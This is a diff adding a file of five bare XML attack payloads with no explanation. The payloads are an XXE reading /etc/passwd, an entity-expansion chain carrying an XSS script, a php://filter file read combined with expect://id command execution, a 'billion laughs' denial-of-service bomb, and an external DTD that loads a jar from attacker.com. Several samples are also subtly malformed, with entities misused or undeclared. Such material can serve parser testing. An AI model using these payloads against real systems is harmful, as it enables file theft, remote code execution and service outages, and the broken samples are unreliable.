@@ -1,0 +1,59 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root (child*)>
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % payload "<!ENTITY &#x25; dtd_bomb '%xxe;'>">
+  %payload;
+]>
+<root>
+  <child attr="test">&dtd_bomb;</child>
+</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE doc [
+  <!ENTITY lhs "&#60;script&#62;alert('xss')&#60;/script&#62;">
+  <!ENTITY rhs "&lhs;&lhs;&lhs;&lhs;&lhs;&lhs;&lhs;&lhs;">
+  <!ENTITY chain "&rhs;&rhs;&rhs;&rhs;">
+]>
+<doc>
+  <element id="1">&chain;</element>
+  <element id="2">&rhs;</element>
+</doc>
+```
+
+```xml
+<!DOCTYPE nested [
+  <!ENTITY % sp SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+  <!ENTITY % spd "<!ENTITY &#x25; ent SYSTEM 'expect://id'>">
+  %spd;
+]>
+<nested>
+  %ent;
+</nested>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<bomb>&lol5;</bomb>
+```
+
+```xml
+<!DOCTYPE test [
+  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8080/evil.dtd">
+  <!ENTITY % file "<!ENTITY &#x25; xxx SYSTEM 'jar:http://attacker.com/poc.jar!/poc.xml'>">
+  %dtd;
+]>
+<test>
+  <data>&xxx;</data>
+</test>
+```
